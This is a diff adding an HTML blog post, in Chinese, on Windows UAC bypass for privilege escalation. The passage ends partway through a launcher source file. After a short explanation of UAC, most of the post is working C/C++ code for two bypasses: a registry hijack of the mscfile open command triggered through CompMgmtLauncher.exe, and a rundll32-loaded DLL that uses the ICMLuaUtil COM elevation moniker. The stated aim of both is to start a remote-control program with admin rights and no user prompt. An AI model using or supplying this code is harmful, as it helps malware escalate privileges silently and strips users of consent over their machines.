@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  
+  
+  
+  
+  
+  <link rel="prev" href="https://SGS4ever.github.io/2020/%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%96%B9%E6%A1%88-rainmeter/" />
+  
+  <link rel="canonical" href="https://SGS4ever.github.io/2020/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-%E7%BB%95%E8%BF%87uac/" />
+  <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           提权技术--绕过UAC | XR_G&#39;s Blog
+       
+  </title>
+  <meta name="title" content="提权技术--绕过UAC | XR_G&#39;s Blog">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="提权技术--绕过UAC"/>
+<meta name="twitter:description" content="最近整理以前的项目，尝试在一个程序上实现进程隐藏和自动提权，结果进程隐藏花了很多时间，没得到一个理想的结果，自动提权倒是参考了几位大佬的文章做出来了。
+话不多说，总结本次的提权办法——绕过UAC。
+ 1. UAC   UAC（User　Account　Control）是Windows系统中的一项安全机制，它可以保证应用程序以非管理员的权限运行。UAC使得所有用户以标准用户权限登录，他们打开的进程（程序）也将以标准权限运行，一款良好的程序应该遵守这一安全规则。
+然而，有些程序如历史遗留的程序，在当年设计阶段并没有很好地考虑到安全问题，它们通常会请求标准权限之外的权限，否则无法正常工作；此外，有些行为如下载应用、修改防火墙设置等都需要标准权限以外的权限来完成。
+当一款应用需要请求标准权限以外的权限时，UAC会将此行为告知用户，这样使得用户对自己电脑上的任何提权行为了如指掌。
+如果你是管理员用户，你可以在任意的程序上右键，选择“以管理员身份运行”，就能看到UAC的弹窗。
+不难理解，通过这样的手段，可以有效地阻止恶意程序在电脑上的破坏行为，或者防止用户对某些系统设置的误更改。
+  2. 绕过UAC   根据参考文章［１］所述，	触发UAC时，系统会创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo 的 RAiLuanchAdminProcess函数。流程如下：
+ 该函数首选验证路径是否在白名单中 接着将结果传递给consent.exe进程 该进程验证请求进程的签名以及发起者的权限是否符合要求后，决定是否弹出UAC窗口让用户确认 UAC窗口会创建新的安全桌面，屏蔽之前的界面，同时UAC窗口进程是系统权限进程，其他普通进程无法和其进行通信交互，用户确认后，调用CreateProcessAsUser函数以管理员身份启动请求的进程。  对于一些恶意程序而言，总是希望在用户不知情的情况下以管理员权限运行，这就需要我们绕过UAC弹窗。目前绕过UAC有两种思路：基于白名单和基于COM组件接口。
+ 2.1 基于白名单的Bypass　UAC   有些系统程序可以直接获取管理员权限，而不触发UAC弹框，这类程序称为白名单程序。例如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe等等。
+针对这些程序，可以使用DLL注入或修改注册表执行命令等方式启动目标程序，由于子进程默认继承父进程的权限，被这些白名单程序所打开的进程也就具备管理员权限了。
+我事先准备了一个远程控制程序RemoteCtrl_Win10.exe，可以基于白名单机制，利用如下的代码尝试启动它：
+#include &lt;Windows.h&gt; BOOL SetReg(char* lpszExePath) { HKEY hKey = NULL; // 创建项  ::RegCreateKeyEx(HKEY_CURRENT_USER, &#34;Software\\Classes\\mscfile\\Shell\\Open\\Command&#34;, 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &amp;hKey, NULL); // 设置键值  ::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)lpszExePath, (1 &#43; ::lstrlen(lpszExePath))); // 关闭注册表  ::RegCloseKey(hKey); return TRUE; } int main() { BOOL bRet = FALSE; PVOID OldValue = NULL; // 关闭文件重定位  ::Wow64DisableWow64FsRedirection(&amp;OldValue); // 修改注册表，设置我们的程序为启动目标  bRet = SetReg(&#34;F:\\RemoteCtrl_Win10."/>
+
+  <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "headline": "提权技术--绕过UAC",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https:\/\/SGS4ever.github.io\/2020\/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-%E7%BB%95%E8%BF%87uac\/"
+  },
+  "image": {
+    "@type": "ImageObject",
+    "url": "https:\/\/SGS4ever.github.io\/cover.png",
+    "width":  800 ,
+    "height":  600 
+  },
+  "genre": "posts",
+  "keywords": "技术, 安全",
+  "wordcount":  591 ,
+  "url": "https:\/\/SGS4ever.github.io\/2020\/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-%E7%BB%95%E8%BF%87uac\/",
+  "datePublished": "2020-12-21T00:00:00\u002b00:00",
+  "dateModified": "2020-12-21T00:00:00\u002b00:00",
+  
+  "publisher": {
+    "@type": "Organization",
+    "name": "XR_G",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https:\/\/SGS4ever.github.io\/logo.png",
+      "width":  127 ,
+      "height":  47 
+    }
+  },
+  "author": {
+    "@type": "Person",
+    "name": "XR_G"
+  },
+  "description": ""
+}
+</script>
+  
+</head>
+
+  
+
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="https://SGS4ever.github.io">主页</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">博文</a>
+                
+                <a class="menu-item" href="/categories/" title="">分类</a>
+                
+                <a class="menu-item" href="/tags/" title="">标签</a>
+                
+                <a class="menu-item" href="/about" title="">关于作者</a>
+                
+                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="https://SGS4ever.github.io">XR_G&#39;s Blog</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">博文</a>
+                
+                <a class="menu-item" href="/categories/" title="">分类</a>
+                
+                <a class="menu-item" href="/tags/" title="">标签</a>
+                
+                <a class="menu-item" href="/about" title="">关于作者</a>
+                
+        </div>
+    </div>
+</nav>
+
+    	 <main class="main">
+        <div id="particles-js" style="position: absolute; width: auto;height: auto;"></div>
+        <script src="https://sgs4ever.github.io/js/particles.js" async="false" ></script>
+        <script src="https://sgs4ever.github.io/js/app.js" async="false" ></script>
+          <div class="container">
+      		
+<article class="post-warp">
+    <header class="post-header">
+        <h1 class="post-title">提权技术--绕过UAC</h1>
+        <div class="post-meta">
+            Written by <a href="https://SGS4ever.github.io" rel="author">XR_G</a> with ♥ 
+                <span class="post-time">
+                    on <time datetime=21210-12-12 >21 December 2020</time>
+                </span>
+                
+                
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <p>最近整理以前的项目，尝试在一个程序上实现进程隐藏和自动提权，结果进程隐藏花了很多时间，没得到一个理想的结果，自动提权倒是参考了几位大佬的文章做出来了。</p>
+<p>话不多说，总结本次的提权办法——绕过UAC。</p>
+<hr>
+<h4 id="1-uac">1. UAC</h4>
+<hr>
+<blockquote>
+<p>UAC（User　Account　Control）是Windows系统中的一项安全机制，它可以保证应用程序以非管理员的权限运行。UAC使得所有用户以标准用户权限登录，他们打开的进程（程序）也将以标准权限运行，一款良好的程序应该遵守这一安全规则。</p>
+<p>然而，有些程序如历史遗留的程序，在当年设计阶段并没有很好地考虑到安全问题，它们通常会请求标准权限之外的权限，否则无法正常工作；此外，有些行为如下载应用、修改防火墙设置等都需要标准权限以外的权限来完成。</p>
+<p>当一款应用需要请求标准权限以外的权限时，UAC会将此行为告知用户，这样使得用户对自己电脑上的任何提权行为了如指掌。</p>
+<p>如果你是管理员用户，你可以在任意的程序上右键，选择“以管理员身份运行”，就能看到UAC的弹窗。</p>
+<p>不难理解，通过这样的手段，可以有效地阻止恶意程序在电脑上的破坏行为，或者防止用户对某些系统设置的误更改。</p>
+</blockquote>
+<hr>
+<h4 id="2-绕过uac">2. 绕过UAC</h4>
+<hr>
+<blockquote>
+<p>根据参考文章［１］所述，	触发UAC时，系统会创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo 的 RAiLuanchAdminProcess函数。流程如下：</p>
+<ul>
+<li>该函数首选验证路径是否在白名单中</li>
+<li>接着将结果传递给consent.exe进程</li>
+<li>该进程验证请求进程的签名以及发起者的权限是否符合要求后，决定是否弹出UAC窗口让用户确认</li>
+<li>UAC窗口会创建新的安全桌面，屏蔽之前的界面，同时UAC窗口进程是系统权限进程，其他普通进程无法和其进行通信交互，用户确认后，调用CreateProcessAsUser函数以管理员身份启动请求的进程。</li>
+</ul>
+<p>对于一些恶意程序而言，总是希望在用户不知情的情况下以管理员权限运行，这就需要我们绕过UAC弹窗。目前绕过UAC有两种思路：基于白名单和基于COM组件接口。</p>
+<hr>
+<h5 id="21-基于白名单的bypassuac">2.1 基于白名单的Bypass　UAC</h5>
+<hr>
+<blockquote>
+<p>有些系统程序可以直接获取管理员权限，而不触发UAC弹框，这类程序称为白名单程序。例如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe等等。</p>
+<p>针对这些程序，可以使用DLL注入或修改注册表执行命令等方式启动目标程序，由于子进程默认继承父进程的权限，被这些白名单程序所打开的进程也就具备管理员权限了。</p>
+<p>我事先准备了一个远程控制程序RemoteCtrl_Win10.exe，可以基于白名单机制，利用如下的代码尝试启动它：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+BOOL <span style="color:#a6e22e">SetReg</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> lpszExePath)
+{
+    HKEY hKey <span style="color:#f92672">=</span> NULL;
+ 
+    <span style="color:#75715e">// 创建项
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">::</span>RegCreateKeyEx(HKEY_CURRENT_USER, <span style="color:#e6db74">&#34;Software</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Classes</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">mscfile</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Shell</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Open</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Command&#34;</span>, <span style="color:#ae81ff">0</span>, NULL, <span style="color:#ae81ff">0</span>, KEY_WOW64_64KEY <span style="color:#f92672">|</span> KEY_ALL_ACCESS, NULL, <span style="color:#f92672">&amp;</span>hKey, NULL);
+
+    <span style="color:#75715e">// 设置键值
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">::</span>RegSetValueEx(hKey, NULL, <span style="color:#ae81ff">0</span>, REG_SZ, (BYTE<span style="color:#f92672">*</span>)lpszExePath, (<span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> <span style="color:#f92672">::</span>lstrlen(lpszExePath)));
+
+    <span style="color:#75715e">// 关闭注册表
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">::</span>RegCloseKey(hKey);
+
+    <span style="color:#66d9ef">return</span> TRUE;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+    BOOL bRet <span style="color:#f92672">=</span> FALSE;
+    PVOID OldValue <span style="color:#f92672">=</span> NULL;
+
+    <span style="color:#75715e">// 关闭文件重定位
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">::</span>Wow64DisableWow64FsRedirection(<span style="color:#f92672">&amp;</span>OldValue);
+
+    <span style="color:#75715e">// 修改注册表，设置我们的程序为启动目标
+</span><span style="color:#75715e"></span>    bRet <span style="color:#f92672">=</span> SetReg(<span style="color:#e6db74">&#34;F:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">RemoteCtrl_Win10.exe&#34;</span>);
+
+    <span style="color:#75715e">// 运行 CompMgmtLauncher.exe
+</span><span style="color:#75715e"></span>    system(<span style="color:#e6db74">&#34;CompMgmtLauncher.exe&#34;</span>);
+
+    printf(<span style="color:#e6db74">&#34;Run OK!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+
+    <span style="color:#75715e">// 恢复文件重定位
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">::</span>Wow64RevertWow64FsRedirection(OldValue);
+    
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>然而，修改注册表的提权方式过于简陋，会被WinDefender拦截下来。</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="../../images/post/UAC%EF%BC%91.png" alt="被识别的行为" class="lazyload"><figcaption class="image-caption">被识别的行为</figcaption></figure></p>
+<p>运行的结果也就不放了。程序会直接被杀死（Defender甚至把我的目标ｅｘｅ给删了）。</p>
+</blockquote>
+<hr>
+<h5 id="22-基于com组件接口的bypassuac">2.2 基于COM组件接口的Bypass　UAC</h5>
+<hr>
+<blockquote>
+<p>我对于COM的理解实际上不够清晰和深入，有兴趣的可以去看看参考文章[1~3]。</p>
+<p>从我的理解来看，COM（Component Object Model，组件对象模型）是一种更加严格的面向对象编程规范，遵守这一规范的二进制程序需要提供标准的接口来供其他程序调用。这种程序以“组件”的方式存在，可以被复用，故节省了内存；而且，由于这些组件独立存在，对它们本身做出的改动不会影响使用者的程序结构，方便了它们的功能升级。</p>
+<p>COM提升名称（COM Elevation Moniker）技术允许运行在用户帐户控制（UAC）下的应用程序，以提升权限的方法来激活COM类，最终提升COM接口权限。简单地说，就是主调程序以COM的规范实例化一个具有管理员权限的组件，这样这个组件的功能函数就能运行在管理员权限下。此外，COM规定了一个ICMLuaUtil接口，其下有一个ShellExcute方法，能够启动任意的程序。</p>
+<p>文章[1]还指出，如果执行COM提升名称代码的程序身份是不可信的，则会触发UAC弹窗；若可信，则不会触发UAC弹窗。所以，要想Bypass UAC，则需要想办法让这段代码在Windows的可信程序中运行。其中，可信程序有计算器、记事本、资源管理器、rundll32.exe等。</p>
+<p>我们仅仅希望以管理员权限启动我们的远控程序，则直接制作一个DLL交给rundll32.exe运行即可。按照上面的思路，我们的DLL应该先实例化一个管理员权限的COM组件，这个提权后的组件调用ShellExcute来启动远控程序。</p>
+<p>DLL项目的代码如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#75715e">// File: CBypassUAC.h
+</span><span style="color:#75715e"></span><span style="color:#75715e">#pragma once
+</span><span style="color:#75715e">#ifndef BYPASS_UAC_H
+</span><span style="color:#75715e">#define BYPASS_UAC_H
+</span><span style="color:#75715e"></span>
+
+
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;windows.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;objbase.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;strsafe.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define CLSID_CMSTPLUA                     L&#34;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}&#34;
+</span><span style="color:#75715e">#define IID_ICMLuaUtil                     L&#34;{6EDD6D74-C007-4E75-B76A-E5740995E24C}&#34;
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">typedef</span> interface ICMLuaUtil ICMLuaUtil;
+
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">ICMLuaUtilVtbl</span> {
+   BEGIN_INTERFACE
+
+       <span style="color:#a6e22e">HRESULT</span>(STDMETHODCALLTYPE<span style="color:#f92672">*</span> QueryInterface)(
+           __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This,
+           __RPC__in REFIID riid,
+           _COM_Outptr_  <span style="color:#66d9ef">void</span><span style="color:#f92672">**</span> ppvObject);
+
+   ULONG(STDMETHODCALLTYPE<span style="color:#f92672">*</span> AddRef)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   ULONG(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Release)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method1)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method2)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method3)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method4)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method5)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method6)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> ShellExec)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This,
+       _In_     LPCWSTR lpFile,
+       _In_opt_  LPCTSTR lpParameters,
+       _In_opt_  LPCTSTR lpDirectory,
+       _In_      ULONG fMask,
+       _In_      ULONG nShow
+       );
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> SetRegistryStringValue)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This,
+       _In_      HKEY hKey,
+       _In_opt_  LPCTSTR lpSubKey,
+       _In_opt_  LPCTSTR lpValueName,
+       _In_      LPCTSTR lpValueString
+       );
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method9)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method10)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method11)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method12)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method13)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method14)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method15)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method16)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method17)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method18)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method19)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+
+   HRESULT(STDMETHODCALLTYPE<span style="color:#f92672">*</span> Method20)(
+       __RPC__in ICMLuaUtil<span style="color:#f92672">*</span> This);
+   END_INTERFACE
+} <span style="color:#f92672">*</span>PICMLuaUtilVtbl;
+
+interface ICMLuaUtil
+{
+   CONST_VTBL <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">ICMLuaUtilVtbl</span><span style="color:#f92672">*</span> lpVtbl;
+};
+
+<span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#66d9ef">__declspec</span>(dllexport) <span style="color:#66d9ef">void</span> CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, <span style="color:#66d9ef">int</span> iCmdShow);
+
+HRESULT <span style="color:#a6e22e">CoCreateInstanceAsAdmin</span>(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID<span style="color:#f92672">*</span> ppVoid);
+
+BOOL <span style="color:#a6e22e">CMLuaUtilBypassUAC</span>(LPWSTR lpwszExecutable);
+
+<span style="color:#75715e">#endif
+</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#75715e">// File: CBypassUAC.c
+</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;CBypassUAC.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// COM提升名称，以管理员权限实例化一个组件
+</span><span style="color:#75715e"></span>HRESULT <span style="color:#a6e22e">CoCreateInstanceAsAdmin</span>(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID<span style="color:#f92672">*</span> ppVoid)
+{
+   BIND_OPTS3 bo;
+   WCHAR wszCLSID[MAX_PATH] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+   WCHAR wszMonikerName[MAX_PATH] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+   HRESULT hr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+   <span style="color:#75715e">// 初始化COM环境
+</span><span style="color:#75715e"></span>   <span style="color:#f92672">::</span>CoInitialize(NULL);
+
+   <span style="color:#75715e">// 构造字符串
+</span><span style="color:#75715e"></span>   <span style="color:#f92672">::</span>StringFromGUID2(rclsid, wszCLSID, (<span style="color:#66d9ef">sizeof</span>(wszCLSID) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(wszCLSID[<span style="color:#ae81ff">0</span>])));
+   hr <span style="color:#f92672">=</span> <span style="color:#f92672">::</span>StringCchPrintfW(wszMonikerName, (<span style="color:#66d9ef">sizeof</span>(wszMonikerName) <span style="color:#f92672">/</span>
+       <span style="color:#66d9ef">sizeof</span>(wszMonikerName[<span style="color:#ae81ff">0</span>])), <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Elevation:Administrator!new:%s&#34;</span>, wszCLSID);
+   <span style="color:#66d9ef">if</span> (FAILED(hr))
+   {
+       <span style="color:#66d9ef">return</span> hr;
+   }
+   <span style="color:#75715e">// 设置BIND_OPTS3
+</span><span style="color:#75715e"></span>   <span style="color:#f92672">::</span>RtlZeroMemory(<span style="color:#f92672">&amp;</span>bo, <span style="color:#66d9ef">sizeof</span>(bo));
+   bo.cbStruct <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(bo);
+   bo.hwnd <span style="color:#f92672">=</span> hWnd;
+   bo.dwClassContext <span style="color:#f92672">=</span> CLSCTX_LOCAL_SERVER;
+   <span style="color:#75715e">// 创建名称对象并获取COM对象
+</span><span style="color:#75715e"></span>   hr <span style="color:#f92672">=</span> <span style="color:#f92672">::</span>CoGetObject(wszMonikerName, <span style="color:#f92672">&amp;</span>bo, riid, ppVoid);
+   <span style="color:#66d9ef">return</span> hr;
+}
+
+BOOL <span style="color:#a6e22e">CMLuaUtilBypassUAC</span>(LPWSTR lpwszExecutable)
+{
+   HRESULT hr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+   CLSID clsidICMLuaUtil <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+   IID iidICMLuaUtil <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+   ICMLuaUtil<span style="color:#f92672">*</span> CMLuaUtil <span style="color:#f92672">=</span> NULL;
+   BOOL bRet <span style="color:#f92672">=</span> FALSE;
+   <span style="color:#66d9ef">do</span> {
+       <span style="color:#f92672">::</span>CLSIDFromString(CLSID_CMSTPLUA, <span style="color:#f92672">&amp;</span>clsidICMLuaUtil);
+       <span style="color:#f92672">::</span>IIDFromString(IID_ICMLuaUtil, <span style="color:#f92672">&amp;</span>iidICMLuaUtil);
+
+       <span style="color:#75715e">// 提权
+</span><span style="color:#75715e"></span>       hr <span style="color:#f92672">=</span> CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID<span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>CMLuaUtil));
+       <span style="color:#66d9ef">if</span> (FAILED(hr))
+       {
+           <span style="color:#66d9ef">break</span>;
+       }
+
+       <span style="color:#75715e">// 启动程序
+</span><span style="color:#75715e"></span>       hr <span style="color:#f92672">=</span> CMLuaUtil<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span>ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, <span style="color:#ae81ff">0</span>, SW_SHOW);
+       <span style="color:#66d9ef">if</span> (FAILED(hr))
+       {
+           <span style="color:#66d9ef">break</span>;
+       }
+       bRet <span style="color:#f92672">=</span> TRUE;
+   } <span style="color:#66d9ef">while</span> (FALSE);
+
+   <span style="color:#75715e">// 释放
+</span><span style="color:#75715e"></span>   <span style="color:#66d9ef">if</span> (CMLuaUtil)
+   {
+       CMLuaUtil<span style="color:#f92672">-&gt;</span>lpVtbl<span style="color:#f92672">-&gt;</span>Release(CMLuaUtil);
+   }
+   <span style="color:#66d9ef">return</span> bRet;
+}
+
+
+<span style="color:#66d9ef">void</span>  CALLBACK <span style="color:#a6e22e">BypassUAC</span>(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, <span style="color:#66d9ef">int</span> iCmdShow)
+{
+   CMLuaUtilBypassUAC((LPWSTR)<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;F:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">RemoteCtrl_Win10.exe&#34;</span>);
+}
+</code></pre></div><p>这里需要注意，我们要在头文件中将目标函数<code>BypassUAC</code>导出，否则rundll32.exe程序无法正确获取这个函数。具体方法就是在函数声明时加上<code>extern &quot;C&quot; __declspec(dllexport)</code>前缀。</p>
+<p>对于DLL项目中的dllmain.cpp文件，保持默认即可。编译此程序，生成一个DLL。现在我们还需要编写一个程序用来调用rundll32.exe，使其执行链接库中的<code>BypassUAC</code>函数。</p>
+<p>新建一个Launcher项目，只有一个源文件：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#75715e">// File: Launcher.cpp
+</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+   <span style="color:#75715e">//调用rundll32.exe去执行RemoteThreadDll.dll的导出函数 达到BypassUAC
+</span><span style="color:#75715e"></span>   <span style="color:#66d9ef">char</span> szCmdLine[MAX_PATH] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+   <span style="color:#66d9ef">char</span> szRundll32Path[MAX_PATH] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">rundll32.exe&#34;</span>;
+
+   <span style="color:#75715e">//获取当前程序所在路径
+</span><span style="color:#75715e"></span>   <span style="color:#66d9ef">char</span> pszFileName[MAX_PATH] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+   GetModuleFileNameA(NULL, pszFileName, MAX_PATH);
+   <span style="color:#75715e">//获取当前程序所在目录
